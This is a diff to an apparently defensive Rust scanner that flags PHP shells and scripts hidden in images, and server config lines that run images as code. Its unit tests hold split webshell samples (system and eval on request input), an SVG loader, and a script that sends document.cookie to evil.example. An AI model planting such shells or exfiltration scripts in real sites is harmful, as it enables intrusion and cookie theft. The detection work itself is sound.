@@ -32,6 +32,14 @@
 
 use std::sync::LazyLock;
 
+/// Version of the scoring rules, recorded in every scan result. A result made by
+/// an older version is dropped after an upgrade instead of being reported or
+/// acted on: version 1 scored pictures with the PHP rules and called ordinary
+/// photos "malicious" (a few bytes of compressed data that spell `<?=`, plus the
+/// weight of a picture in `uploads`). Raise it whenever a change to the rules
+/// would make an earlier result misleading.
+pub const SCORER_VERSION: u32 = 2;
+
 fn s(parts: &[&str]) -> String {
     parts.concat()
 }
@@ -162,15 +170,40 @@ fn bare_calls(low: &[u8], needle: &str) -> Vec<usize> {
         .collect()
 }
 
-/// The argument text of a call: from just after `(` to the end of the
-/// statement (`;`) or 240 bytes, whichever comes first.
+/// The argument text of a call: from just after `(` to the `)` that closes it,
+/// the end of the statement (`;`) or 240 bytes, whichever comes first. A bracket
+/// inside quotes does not count, so `system(")" . $_GET[0])` is read whole; and
+/// what follows the call, as in `call_user_func($f) : ($_SERVER['x'] ?? 0)`, is
+/// not one of its arguments.
 fn args_window(low: &[u8], start: usize) -> &[u8] {
     let end = (start + 240).min(low.len());
     let w = &low[start..end];
-    match memchr::memchr(b';', w) {
-        Some(i) => &w[..i],
-        None => w,
+    let mut depth = 0usize;
+    let mut i = 0;
+    while i < w.len() {
+        match w[i] {
+            q @ (b'\'' | b'"') => {
+                i += 1;
+                while i < w.len() && w[i] != q {
+                    if w[i] == b'\\' {
+                        i += 1;
+                    }
+                    i += 1;
+                }
+            }
+            b'(' => depth += 1,
+            b')' => {
+                if depth == 0 {
+                    return &w[..i];
+                }
+                depth -= 1;
+            }
+            b';' => return &w[..i],
+            _ => {}
+        }
+        i += 1;
     }
+    w
 }
 
 /// Names of variables assigned directly from request input
@@ -581,6 +614,585 @@ fn snippet(content: &[u8], off: usize) -> String {
     s.replace(['\n', '\r'], " ").chars().take(160).collect()
 }
 
+// ---------------------------------------------------------------------------
+// Images, and files that only carry an image's name
+// ---------------------------------------------------------------------------
+//
+// A picture is a good hiding place: nothing looks at it, and one line in
+// `.htaccess` (or `.user.ini`) makes the web server run it as code. So the
+// scorer answers three questions about a file named like an image:
+//   * is it really a picture (by its first bytes, not by its name)?
+//   * is there code in it (a PHP open tag, a script, an event handler)?
+//   * is there something after the end of the picture?
+// and a second one about the files that turn pictures into code.
+//
+// Random bytes in compressed picture data spell short strings by chance, so
+// nothing here trusts a bare `<?=` or a bare `eval(`: a PHP open tag must be
+// followed by text that reads like code, and script words only count where a
+// script (tag, handler, `javascript:`) is present.
+
+/// Extensions that are pictures, shared by the scanner and its tests.
+pub const IMAGE_EXTS: &[&str] = &[
+    "jpg", "jpeg", "jpe", "jfif", "png", "gif", "webp", "bmp", "ico", "cur", "svg", "tif", "tiff",
+    "avif", "heic", "heif",
+];
+
+/// Extensions of files that hold plain data; mapping them to a code handler
+/// is as wrong as mapping a picture.
+const DATA_EXTS: &[&str] = &[
+    "txt", "css", "js", "json", "xml", "csv", "log", "ini", "pdf", "zip", "mp3", "mp4", "woff",
+    "woff2", "ttf",
+];
+
+/// Extensions a server runs as PHP.
+const PHP_LIKE_EXTS: &[&str] = &[
+    "php", "phtml", "php3", "php4", "php5", "php6", "php7", "php8", "pht", "phtm", "phar", "phps",
+];
+
+/// Name parts that make `x.<part>.jpg` run as a script on a server that maps
+/// the extension anywhere in the file name.
+const SCRIPT_NAME_PARTS: &[&str] = &[
+    "php", "phtml", "php3", "php4", "php5", "php6", "php7", "php8", "pht", "phtm", "phar", "phps",
+    "cgi", "pl", "py", "sh", "asp", "aspx", "jsp",
+];
+
+/// Script words that hide or run a payload.
+static JS_OBFUSCATION: LazyLock<Vec<String>> = LazyLock::new(|| {
+    vec![
+        s(&["ev", "al("]),
+        "atob(".into(),
+        "fromcharcode".into(),
+        "unescape(".into(),
+        "document.write(".into(),
+        "new function(".into(),
+    ]
+});
+
+/// Script words that steal data or send the visitor elsewhere.
+const JS_EXFIL_REDIRECT: &[&str] = &[
+    "document.cookie",
+    "localstorage",
+    "window.location",
+    "location.href",
+    "location.replace",
+    "document.location",
+    "xmlhttprequest",
+    "fetch(",
+    "sendbeacon",
+];
+
+/// Event names that, as an attribute, run script on a picture or page.
+const EVENT_NAMES: &[&[u8]] = &[
+    b"load",
+    b"error",
+    b"click",
+    b"mouseover",
+    b"mouseenter",
+    b"mouseout",
+    b"mousedown",
+    b"mousemove",
+    b"focus",
+    b"focusin",
+    b"begin",
+    b"end",
+    b"repeat",
+    b"activate",
+    b"animationstart",
+    b"animationend",
+    b"toggle",
+    b"pointerover",
+    b"pointerenter",
+    b"loadstart",
+    b"unload",
+    b"submit",
+    b"input",
+    b"change",
+    b"keydown",
+    b"keyup",
+    b"scroll",
+    b"wheel",
+    b"resize",
+];
+
+/// What a file's first bytes say it is.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Kind {
+    /// A raster picture: JPEG, PNG, GIF, WebP, BMP, ICO, TIFF, HEIF/AVIF.
+    Image,
+    /// Vector markup: it is text, so it can carry script.
+    Svg,
+    /// ELF, Windows executable, or a `#!` script.
+    Executable,
+    /// zip, rar, gzip, 7z.
+    Archive,
+    /// Plain text: a page, a script, a stub.
+    Text,
+    /// Binary that is none of the above (a damaged picture, a rare format).
+    Other,
+}
+
+fn is_text_byte(b: u8) -> bool {
+    matches!(b, b'\t' | b'\n' | b'\r' | 0x20..=0x7e)
+}
+
+/// At least 9 in 10 of the first KB are plain text and there is no NUL.
+fn looks_like_text(sample: &[u8]) -> bool {
+    let sample = &sample[..sample.len().min(1024)];
+    if sample.len() < 16 || sample.contains(&0) {
+        return false;
+    }
+    let text = sample.iter().filter(|&&b| is_text_byte(b)).count();
+    text * 10 >= sample.len() * 9
+}
+
+fn sniff(content: &[u8]) -> Kind {
+    let h = content;
+    let starts = |p: &[u8]| h.starts_with(p);
+    if starts(&[0xFF, 0xD8, 0xFF])
+        || starts(&[0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A])
+        || starts(b"GIF87a")
+        || starts(b"GIF89a")
+        || (h.len() >= 12 && &h[..4] == b"RIFF" && &h[8..12] == b"WEBP")
+        || (h.len() >= 14 && &h[..2] == b"BM" && h[6..10] == [0, 0, 0, 0])
+        || starts(&[0, 0, 1, 0])
+        || starts(&[0, 0, 2, 0])
+        || starts(&[b'I', b'I', 0x2A, 0])
+        || starts(&[b'M', b'M', 0, 0x2A])
+        || (h.len() >= 12 && &h[4..8] == b"ftyp")
+    {
+        return Kind::Image;
+    }
+    if starts(b"\x7fELF")
+        || starts(b"#!")
+        || (starts(b"MZ") && memchr::memmem::find(&h[..h.len().min(1024)], b"PE\0\0").is_some())
+    {
+        return Kind::Executable;
+    }
+    if starts(b"PK\x03\x04")
+        || starts(b"Rar!")
+        || starts(&[0x1F, 0x8B])
+        || starts(&[b'7', b'z', 0xBC, 0xAF, 0x27, 0x1C])
+    {
+        return Kind::Archive;
+    }
+    if looks_like_text(h) {
+        let head: Vec<u8> = h[..h.len().min(4096)].to_ascii_lowercase();
+        return if memchr::memmem::find(&head, b"<svg").is_some() {
+            Kind::Svg
+        } else {
+            Kind::Text
+        };
+    }
+    Kind::Other
+}
+
+/// Offset of the first PHP open tag that is followed by something that reads as
+/// code, in lowercased bytes. `allow_short` also accepts `<?` + whitespace, only
+/// safe in text: in picture data, `<?` and a space can be chance.
+fn find_php_open_low(low: &[u8], allow_short: bool) -> Option<usize> {
+    for off in memchr::memmem::find_iter(low, b"<?") {
+        let rest = &low[off + 2..];
+        let skip =
+            if rest.starts_with(b"php") && rest.get(3).is_some_and(|b| b.is_ascii_whitespace()) {
+                4
+            } else if rest.starts_with(b"=")
+                || (allow_short && rest.first().is_some_and(|b| b.is_ascii_whitespace()))
+            {
+                1
+            } else {
+                continue;
+            };
+        // The text that runs on from the tag: code is text, picture data is
+        // not, so a tag met by chance is followed by a few bytes at most.
+        let code = &rest[skip..];
+        let run = code.iter().take_while(|&&b| is_text_byte(b)).count();
+        let short_tag = skip == 1;
+        let need = if short_tag { 8 } else { 4 };
+        if run < need.min(code.len()) || run == 0 {
+            continue;
+        }
+        // `<?=` and `<? ` are two or three bytes, and a handful of text bytes
+        // follow them by chance now and then in 200,000 pictures: also ask for
+        // a statement (`<?=`: a variable or a call) that ends (`;` or `?>`).
+        if short_tag {
+            let c = &code[..run];
+            let ends = c.contains(&b';') || memchr::memmem::find(c, b"?>").is_some();
+            let statement = !rest.starts_with(b"=") || c.iter().any(|&b| b == b'$' || b == b'(');
+            if !(ends && statement) {
+                continue;
+            }
+        }
+        return Some(off);
+    }
+    for tag in [
+        &b"<script language=\"php\""[..],
+        &b"<script language='php'"[..],
+    ] {
+        if let Some(off) = memchr::memmem::find(low, tag) {
+            return Some(off);
+        }
+    }
+    None
+}
+
+/// Does the file hold a PHP open tag followed by code? For the files the
+/// scanner opens only because they changed recently, not because of their name.
+#[must_use]
+pub fn has_php_marker(content: &[u8]) -> bool {
+    let low: Vec<u8> = content.iter().map(u8::to_ascii_lowercase).collect();
+    find_php_open_low(&low, true).is_some()
+}
+
+/// The score under construction, with the offset of its strongest hit.
+#[derive(Default)]
+struct Acc {
+    score: u32,
+    hits: Vec<Hit>,
+    offset: Option<usize>,
+    context: String,
+}
+
+impl Acc {
+    fn add(&mut self, rule: &'static str, weight: u32, offset: Option<usize>) {
+        self.score += weight;
+        self.hits.push(Hit { rule, weight });
+        if self.offset.is_none() {
+            self.offset = offset;
+        }
+    }
+
+    fn finish(self, content: &[u8]) -> Score {
+        let verdict = if self.score >= 100 {
+            Verdict::Malicious
+        } else if self.score >= 70 {
+            Verdict::Suspicious
+        } else {
+            Verdict::Clean
+        };
+        let context = if self.context.is_empty() {
+            self.offset
+                .map(|off| masked_snippet(content, off))
+                .unwrap_or_default()
+        } else {
+            self.context
+        };
+        Score {
+            score: self.score,
+            verdict,
+            hits: self.hits,
+            context,
+        }
+    }
+}
+
+/// An excerpt in which anything that is not text (picture data) is a space.
+fn masked_snippet(content: &[u8], off: usize) -> String {
+    let start = off.saturating_sub(40);
+    let end = (off + 120).min(content.len());
+    let text: String = content[start..end]
+        .iter()
+        .map(|&b| if is_text_byte(b) { b as char } else { ' ' })
+        .collect();
+    text.split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+        .chars()
+        .take(160)
+        .collect()
+}
+
+/// The bytes from `off` on with everything that is not text turned into a
+/// space, so the PHP scorer sees the code and not the picture around it.
+fn text_segment(content: &[u8], off: usize, max: usize) -> Vec<u8> {
+    content[off..(off + max).min(content.len())]
+        .iter()
+        .map(|&b| if is_text_byte(b) { b } else { b' ' })
+        .collect()
+}
+
+/// `x.php.jpg`: a script name part before the picture extension.
+fn double_extension(name: &str) -> bool {
+    let parts: Vec<&str> = name.split('.').collect();
+    parts.len() >= 3
+        && parts[1..parts.len() - 1]
+            .iter()
+            .any(|p| SCRIPT_NAME_PARTS.contains(p))
+}
+
+/// ` onload=`, ` onerror=` and the like: an attribute that runs script.
+fn event_handler(low: &[u8]) -> Option<usize> {
+    for off in memchr::memmem::find_iter(low, b"on") {
+        let Some(&prev) = off.checked_sub(1).and_then(|i| low.get(i)) else {
+            continue;
+        };
+        if !(prev.is_ascii_whitespace() || matches!(prev, b'"' | b'\'' | b'/')) {
+            continue;
+        }
+        let name_len = low[off + 2..]
+            .iter()
+            .take_while(|b| b.is_ascii_lowercase())
+            .count();
+        if name_len == 0 || name_len > 16 {
+            continue;
+        }
+        if !EVENT_NAMES.contains(&&low[off + 2..off + 2 + name_len]) {
+            continue;
+        }
+        let mut k = off + 2 + name_len;
+        while low.get(k).is_some_and(|b| b.is_ascii_whitespace()) {
+            k += 1;
+        }
+        if low.get(k) == Some(&b'=') {
+            return Some(off);
+        }
+    }
+    None
+}
+
+/// A `<script>` that loads its code from another address.
+fn remote_script(low: &[u8]) -> bool {
+    memchr::memmem::find_iter(low, b"<script")
+        .take(32)
+        .any(|off| {
+            let w = &low[off..(off + 400).min(low.len())];
+            let has = |n: &[u8]| memchr::memmem::find(w, n).is_some();
+            (has(b"src=") || has(b"href=")) && (has(b"http:") || has(b"https:") || has(b"//"))
+        })
+}
+
+/// Script found in a picture or page: tags, handlers, `javascript:`, and, only
+/// when one of those is there, the words that hide a payload or move a visitor.
+fn score_markup(acc: &mut Acc, low: &[u8]) {
+    let find = |n: &[u8]| memchr::memmem::find(low, n);
+    let mut in_code = false;
+    if let Some(off) = find(b"<script") {
+        acc.add("script-in-image", 40, Some(off));
+        in_code = true;
+        if remote_script(low) {
+            acc.add("remote-script", 40, Some(off));
+        }
+    }
+    if let Some(off) = event_handler(low) {
+        acc.add("event-handler-in-image", 30, Some(off));
+        in_code = true;
+    }
+    if let Some(off) = find(b"javascript:") {
+        acc.add("javascript-uri", 50, Some(off));
+        in_code = true;
+    }
+    if let Some(off) = [&b"<foreignobject"[..], b"<iframe", b"<embed", b"<object"]
+        .iter()
+        .find_map(|n| find(n))
+    {
+        acc.add("embedded-frame", 30, Some(off));
+    }
+    if let Some(off) = find(b"data:text/html") {
+        acc.add("data-html-uri", 40, Some(off));
+    }
+    if in_code {
+        if let Some(off) = JS_OBFUSCATION.iter().find_map(|n| find(n.as_bytes())) {
+            acc.add("js-obfuscation", 50, Some(off));
+        }
+        if let Some(off) = JS_EXFIL_REDIRECT.iter().find_map(|n| find(n.as_bytes())) {
+            acc.add("js-exfil-redirect", 30, Some(off));
+        }
+    }
+}
+
+/// Text at the very end of a real picture: whatever follows the image data.
+/// Picture data ends in binary, so a run of text there was added.
+fn trailing_text(content: &[u8]) -> &[u8] {
+    let floor = content.len().saturating_sub(65_536);
+    let mut i = content.len();
+    while i > floor && is_text_byte(content[i - 1]) {
+        i -= 1;
+    }
+    content[i..].trim_ascii()
+}
+
+/// Score a file named like a picture. `content` is the whole file, or, for a
+/// large one, its first and last parts joined (a payload sits in the metadata at
+/// the start or is appended at the end).
+#[must_use]
+pub fn score_image(name: &str, content: &[u8]) -> Score {
+    let name = name.to_ascii_lowercase();
+    let low: Vec<u8> = content.iter().map(u8::to_ascii_lowercase).collect();
+    let kind = sniff(content);
+    let mut acc = Acc::default();
+
+    if double_extension(&name) {
+        acc.add("double-extension", 40, None);
+    }
+    match kind {
+        Kind::Executable => acc.add("executable-as-image", 100, Some(0)),
+        Kind::Archive => acc.add("archive-as-image", 70, Some(0)),
+        Kind::Text => acc.add("text-in-image-name", 40, Some(0)),
+        Kind::Image | Kind::Svg | Kind::Other => {}
+    }
+
+    // Code in the file. The PHP scorer reads just the code around the tag.
+    let allow_short = matches!(kind, Kind::Text | Kind::Svg);
+    if let Some(off) = find_php_open_low(&low, allow_short) {
+        acc.add("php-in-image", 70, Some(off));
+        let seg = text_segment(content, off, 8192);
+        let inner = score_php(&seg, false, false);
+        for h in inner.hits {
+            acc.add(h.rule, h.weight, None);
+        }
+        acc.context = masked_snippet(content, off);
+    }
+    score_markup(&mut acc, &low);
+
+    // Something after the end of a real picture.
+    if kind == Kind::Image {
+        let tail = trailing_text(content);
+        if tail.len() >= 32 && looks_like_text(tail) {
+            acc.add("appended-text", 40, Some(content.len() - tail.len()));
+            let tail_low = tail.to_ascii_lowercase();
+            let has = |n: &[u8]| memchr::memmem::find(&tail_low, n).is_some();
+            if JS_OBFUSCATION.iter().any(|n| has(n.as_bytes()))
+                || JS_EXFIL_REDIRECT.iter().any(|n| has(n.as_bytes()))
+                || has(b"base64_decode")
+                || has(b"<script")
+            {
+                acc.add("appended-code", 40, None);
+            }
+        }
+    }
+    acc.finish(content)
+}
+
+// ---- files that make pictures run as code ---------------------------------
+
+/// Does this handler or type run code (PHP, CGI) rather than serve a file?
+fn runs_code(handler: &str) -> bool {
+    ["php", "cgi-script", "fcgid-script", "lsapi"]
+        .iter()
+        .any(|n| handler.contains(n))
+}
+
+/// Does a `<FilesMatch>`/`<Files>` header name picture files?
+fn names_an_image(header: &str) -> bool {
+    [
+        "jpg", "jpeg", "png", "gif", "webp", "ico", "bmp", "svg", "image",
+    ]
+    .iter()
+    .any(|n| header.contains(n))
+}
+
+fn unquote(v: &str) -> &str {
+    v.trim().trim_matches(|c| c == '"' || c == '\'')
+}
+
+/// Where `auto_prepend_file` / `auto_append_file` points. A security plugin
+/// points it at a PHP file of its own, so only a target that is not PHP at all,
+/// or PHP in a folder that holds uploads or temporary files, is reported.
+fn auto_include(acc: &mut Acc, value: &str, line: &str) {
+    let v = unquote(value);
+    if v.is_empty() || v == "none" {
+        return;
+    }
+    let file = v.rsplit('/').next().unwrap_or(v);
+    let ext = file.rsplit_once('.').map_or("", |(_, e)| e);
+    if PHP_LIKE_EXTS.contains(&ext) {
+        let odd = ["/uploads/", "/cache/", "/tmp/", "/wp-content/upgrade/"]
+            .iter()
+            .any(|p| v.contains(p))
+            || v.contains("/.");
+        if odd {
+            acc.add("config-auto-include-odd-path", 80, None);
+            acc.context = line.chars().take(160).collect();
+        }
+    } else {
+        acc.add("config-auto-include-nonphp", 100, None);
+        acc.context = line.chars().take(160).collect();
+    }
+}
+
+fn htaccess_line(acc: &mut Acc, line: &str, in_image_block: &mut bool) {
+    if let Some(rest) = line
+        .strip_prefix("<filesmatch")
+        .or_else(|| line.strip_prefix("<files"))
+    {
+        *in_image_block = names_an_image(rest);
+        return;
+    }
+    if line.starts_with("</files") {
+        *in_image_block = false;
+        return;
+    }
+    let mut words = line.split_whitespace();
+    match words.next().unwrap_or("") {
+        "addhandler" | "addtype" => {
+            if !words.next().is_some_and(runs_code) {
+                return;
+            }
+            for ext in words {
+                let ext = unquote(ext).trim_start_matches('.');
+                if IMAGE_EXTS.contains(&ext) {
+                    acc.add("config-image-as-code", 100, None);
+                    acc.context = line.chars().take(160).collect();
+                    return;
+                }
+                if DATA_EXTS.contains(&ext) {
+                    acc.add("config-data-as-code", 60, None);
+                    acc.context = line.chars().take(160).collect();
+                    return;
+                }
+            }
+        }
+        "sethandler" | "forcetype" => {
+            if *in_image_block && words.next().is_some_and(runs_code) {
+                acc.add("config-image-as-code", 100, None);
+                acc.context = line.chars().take(160).collect();
+            }
+        }
+        "php_value" | "php_admin_value" => {
+            if matches!(words.next(), Some("auto_prepend_file" | "auto_append_file")) {
+                auto_include(acc, words.next().unwrap_or(""), line);
+            }
+        }
+        _ => {}
+    }
+}
+
+fn ini_line(acc: &mut Acc, line: &str) {
+    let Some((key, value)) = line.split_once('=') else {
+        return;
+    };
+    let value = value.split(';').next().unwrap_or("");
+    match key.trim() {
+        "auto_prepend_file" | "auto_append_file" => auto_include(acc, value, line),
+        "allow_url_include" if matches!(unquote(value), "on" | "1" | "true" | "yes") => {
+            acc.add("config-allow-url-include", 50, None);
+            acc.context = line.chars().take(160).collect();
+        }
+        _ => {}
+    }
+}
+
+/// Score a server configuration file that can turn pictures into code:
+/// `.htaccess`, `.user.ini`, `php.ini`. `name` is the file name.
+#[must_use]
+pub fn score_config(name: &str, content: &[u8]) -> Score {
+    let name = name.to_ascii_lowercase();
+    let text = String::from_utf8_lossy(content).to_ascii_lowercase();
+    let mut acc = Acc::default();
+    let mut in_image_block = false;
+    for raw in text.lines() {
+        let line = raw.trim();
+        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
+            continue;
+        }
+        if name == ".htaccess" {
+            htaccess_line(&mut acc, line, &mut in_image_block);
+        } else {
+            ini_line(&mut acc, line);
+        }
+    }
+    acc.finish(content)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -717,6 +1329,24 @@ mod tests {
     }
 
     #[test]
+    fn what_follows_a_call_is_not_its_argument() {
+        // Laravel's ParallelTesting: a callback called in one branch of a ternary
+        // and request input read in the other. Flagged "malicious" in the field.
+        let src = cat(&[
+            "<?php return $this->tokenResolver ? call_user_func($this->tokenResolver) : ($_",
+            "SERVER['TEST_TOKEN'] ?? false);",
+        ]);
+        assert_eq!(verdict(&src), Verdict::Clean);
+        // Input inside the call is still a shell, whatever brackets sit in quotes.
+        let shell = cat(&["<?php ", "sys", "tem(\")\" . $_", "GET['c']);"]);
+        assert_eq!(verdict(&shell), Verdict::Malicious);
+        let open = cat(&["<?php ", "sys", "tem(\"x(\" . $_", "GET['c']);"]);
+        assert_eq!(verdict(&open), Verdict::Malicious);
+        let nested = cat(&["<?php ", "ev", "al(base64_decode(trim($_", "POST['x'])));"]);
+        assert_eq!(verdict(&nested), Verdict::Malicious);
+    }
+
+    #[test]
     fn wp_filesystem_is_not_the_system_call() {
         let src = cat(&[
             "<?php if ( ! WP_Filesystem( $credentials ) ) { ",
@@ -793,5 +1423,373 @@ mod tests {
         let src = cat(&["<?php //ionCube Loader\n", "$data = 'AAAA';"]);
         // No decode/eval rules fire, so this is not malicious either way.
         assert_ne!(verdict(&src), Verdict::Malicious);
+    }
+
+    // ---- pictures -------------------------------------------------------
+
+    /// Deterministic bytes that look like compressed picture data.
+    fn noise(n: usize, seed: u64) -> Vec<u8> {
+        let mut x = seed;
+        (0..n)
+            .map(|_| {
+                x = x
+                    .wrapping_mul(6364136223846793005)
+                    .wrapping_add(1442695040888963407);
+                (x >> 33) as u8
+            })
+            .collect()
+    }
+
+    const JPEG_HEAD: &[u8] = &[0xFF, 0xD8, 0xFF, 0xE0, 0, 16, b'J', b'F', b'I', b'F', 0];
+    const JPEG_END: &[u8] = &[0xFF, 0xD9];
+    const PNG_HEAD: &[u8] = &[0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A];
+    const PNG_END: &[u8] = &[0, 0, 0, 0, b'I', b'E', b'N', b'D', 0xAE, 0x42, 0x60, 0x82];
+
+    fn picture(head: &[u8], middle: &[u8], end: &[u8]) -> Vec<u8> {
+        let mut v = head.to_vec();
+        v.extend(noise(6000, 7));
+        v.extend(middle);
+        v.extend(noise(6000, 11));
+        v.extend(end);
+        v
+    }
+
+    fn img(name: &str, bytes: &[u8]) -> Score {
+        score_image(name, bytes)
+    }
+
+    fn has_rule(s: &Score, rule: &str) -> bool {
+        s.hits.iter().any(|h| h.rule == rule)
+    }
+
+    #[test]
+    fn a_shell_inside_a_real_jpeg_is_malicious() {
+        let shell = cat(&["<?php ", "sys", "tem(", "$_", "GET['c']); ?>"]);
+        let s = img("logo.jpg", &picture(JPEG_HEAD, &shell, JPEG_END));
+        assert_eq!(s.verdict, Verdict::Malicious, "hits={:?}", s.hits);
+        assert!(has_rule(&s, "php-in-image") && has_rule(&s, "source-to-sink"));
+        assert!(s.context.contains("<?php"), "{}", s.context);
+    }
+
+    #[test]
+    fn a_shell_behind_a_gif_header_is_malicious() {
+        let mut v = b"GIF89a;".to_vec();
+        v.extend(cat(&["<?php ", "ev", "al(", "$_", "POST['x']);"]));
+        assert_eq!(img("a.gif", &v).verdict, Verdict::Malicious);
+    }
+
+    #[test]
+    fn plain_php_in_a_picture_is_suspicious_for_a_human() {
+        let s = img("x.png", &picture(PNG_HEAD, b"<?php echo 1; ?>", PNG_END));
+        assert_eq!(s.verdict, Verdict::Suspicious, "hits={:?}", s.hits);
+    }
+
+    #[test]
+    fn the_open_tag_is_found_in_any_case() {
+        let s = img("x.png", &picture(PNG_HEAD, b"<?PHP echo 1; ?>", PNG_END));
+        assert!(has_rule(&s, "php-in-image"));
+        let short = img(
+            "x.jpg",
+            &picture(JPEG_HEAD, b"<?= $a; echo $b; ?>", JPEG_END),
+        );
+        assert!(has_rule(&short, "php-in-image"));
+    }
+
+    #[test]
+    fn chance_bytes_in_picture_data_are_not_a_php_tag() {
+        // `<?=` and `<?` + space turn up by chance in compressed data; what
+        // follows is binary, not code.
+        let chance: &[u8] = b"<?=\x00\x81\x9c\xfe\x13\xaa\xbb\xcc\xdd\xee\xff\x01\x02\x03\x04";
+        let s = img("photo.jpg", &picture(JPEG_HEAD, chance, JPEG_END));
+        assert_eq!(s.verdict, Verdict::Clean, "hits={:?}", s.hits);
+        let sp: &[u8] = b"<? \x00\x81\x9c\xfe\x13\xaa\xbb\xcc\xdd\xee\xff\x01\x02\x03\x04";
+        assert_eq!(
+            img("photo.jpg", &picture(JPEG_HEAD, sp, JPEG_END)).verdict,
+            Verdict::Clean
+        );
+    }
+
+    #[test]
+    fn a_few_text_bytes_after_a_chance_tag_are_still_not_code() {
+        // Seen in a real PNG among 223,000 pictures: `<?=` and a dozen printable
+        // bytes of compressed data. Nothing in it ends a statement.
+        let chance: &[u8] = b"<?=a~=b9-( gXr\x00\x81\x9c\xfe\x13\xaa\xbb\xcc\xdd\xee\xff\x01\x02";
+        let s = img("photo.png", &picture(PNG_HEAD, chance, PNG_END));
+        assert_eq!(s.verdict, Verdict::Clean, "hits={:?}", s.hits);
+        // A short tag with a real statement still counts.
+        let real: &[u8] = b"<?= $_GET['a']; ?>\x00\x81\x9c";
+        assert!(has_rule(
+            &img("a.png", &picture(PNG_HEAD, real, PNG_END)),
+            "php-in-image"
+        ));
+    }
+
+    #[test]
+    fn xmp_metadata_is_not_php() {
+        let xmp = br#"<?xpacket begin="" id="W5M0"?><x:xmpmeta xmlns:x="adobe:ns:meta/"></x:xmpmeta><?xpacket end="w"?>"#;
+        let s = img("a.jpg", &picture(JPEG_HEAD, xmp, JPEG_END));
+        assert_eq!(s.verdict, Verdict::Clean, "hits={:?}", s.hits);
+    }
+
+    #[test]
+    fn a_text_file_named_like_a_picture_is_a_php_file_in_disguise() {
+        let v = cat(&["<?php ", "ev", "al(", "$_", "POST['x']);"]);
+        let s = img("avatar.jpg", &v);
+        assert_eq!(s.verdict, Verdict::Malicious);
+        assert!(has_rule(&s, "text-in-image-name"));
+        // The short tag counts in text.
+        let short = img("a.png", b"<? echo 'this page is not an image at all'; ?>");
+        assert!(has_rule(&short, "php-in-image"));
+    }
+
+    #[test]
+    fn a_program_named_like_a_picture_is_malicious() {
+        let mut elf = b"\x7fELF\x02\x01\x01".to_vec();
+        elf.extend(noise(300, 3));
+        assert_eq!(img("bg.jpg", &elf).verdict, Verdict::Malicious);
+        let script = b"#!/usr/bin/perl\nuse Socket; print 'connect back to the server';\n";
+        assert_eq!(img("bg.png", script).verdict, Verdict::Malicious);
+    }
+
+    #[test]
+    fn an_archive_named_like_a_picture_is_reported() {
+        let mut zip = b"PK\x03\x04".to_vec();
+        zip.extend(noise(300, 5));
+        assert_eq!(img("kit.jpg", &zip).verdict, Verdict::Suspicious);
+    }
+
+    #[test]
+    fn an_html_page_named_like_a_picture_is_judged_by_its_script() {
+        let broken = b"<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>";
+        assert_eq!(
+            img("a.jpg", broken).verdict,
+            Verdict::Clean,
+            "a saved error page"
+        );
+        let skimmer = cat(&[
+            "<html><script>var u = atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGU='); ",
+            "window.location = u;</script></html>",
+        ]);
+        let s = img("a.jpg", &skimmer);
+        assert_eq!(s.verdict, Verdict::Malicious, "hits={:?}", s.hits);
+    }
+
+    #[test]
+    fn a_plain_svg_is_clean_and_a_scripted_one_is_not() {
+        let plain = br#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5z"/></svg>"#;
+        assert_eq!(img("icon.svg", plain).verdict, Verdict::Clean);
+        let loader = cat(&[
+            "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>",
+            "ev",
+            "al(atob('YWxlcnQoMSk=')); document.location='https://x.example/';</script></svg>",
+        ]);
+        let s = img("logo.svg", &loader);
+        assert_eq!(s.verdict, Verdict::Malicious, "hits={:?}", s.hits);
+        let handler = cat(&[
+            "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"",
+            "ev",
+            "al(atob('YWxlcnQoMSk='))\"></svg>",
+        ]);
+        assert_eq!(img("a.svg", &handler).verdict, Verdict::Suspicious);
+        // A handler alone is a test page, not an attack.
+        let alert = br#"<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>"#;
+        assert_eq!(img("a.svg", alert).verdict, Verdict::Clean);
+    }
+
+    #[test]
+    fn script_words_without_a_script_are_not_counted() {
+        let svg =
+            br#"<svg xmlns="http://www.w3.org/2000/svg"><text>fetch( the atob( word</text></svg>"#;
+        assert_eq!(img("a.svg", svg).verdict, Verdict::Clean);
+    }
+
+    #[test]
+    fn script_in_a_pictures_metadata_is_reported() {
+        let xss = cat(&[
+            "<script src=\"https://evil.example/x.js\"></script>",
+            "<script>fetch('https://evil.example/c?'+document.cookie)</script>",
+        ]);
+        let s = img("a.jpg", &picture(JPEG_HEAD, &xss, JPEG_END));
+        assert!(s.verdict != Verdict::Clean, "hits={:?}", s.hits);
+        assert!(has_rule(&s, "remote-script"));
+    }
+
+    #[test]
+    fn text_added_after_the_end_of_a_picture() {
+        // Padding that says nothing: only a note, not a verdict.
+        let pad = "x1y2z3".repeat(20);
+        let s = img(
+            "a.png",
+            &picture(PNG_HEAD, b"", &[PNG_END, pad.as_bytes()].concat()),
+        );
+        assert!(has_rule(&s, "appended-text") && !has_rule(&s, "appended-code"));
+        assert_eq!(s.verdict, Verdict::Clean);
+        // A loader behind the picture.
+        let loader = cat(&[
+            "var s=String.fromCharCode(104,116,116,112); document.write(unescape('%3Cb%3E'));",
+        ]);
+        let s = img(
+            "a.png",
+            &picture(PNG_HEAD, b"", &[PNG_END, &loader].concat()),
+        );
+        assert_eq!(s.verdict, Verdict::Suspicious, "hits={:?}", s.hits);
+        assert!(has_rule(&s, "appended-code"));
+    }
+
+    #[test]
+    fn a_photo_with_binary_after_the_image_is_clean() {
+        // Phones append a video or a trailer after the JPEG; it is binary.
+        let mut tail = b"\x00\x00\x00\x18ftypmp42".to_vec();
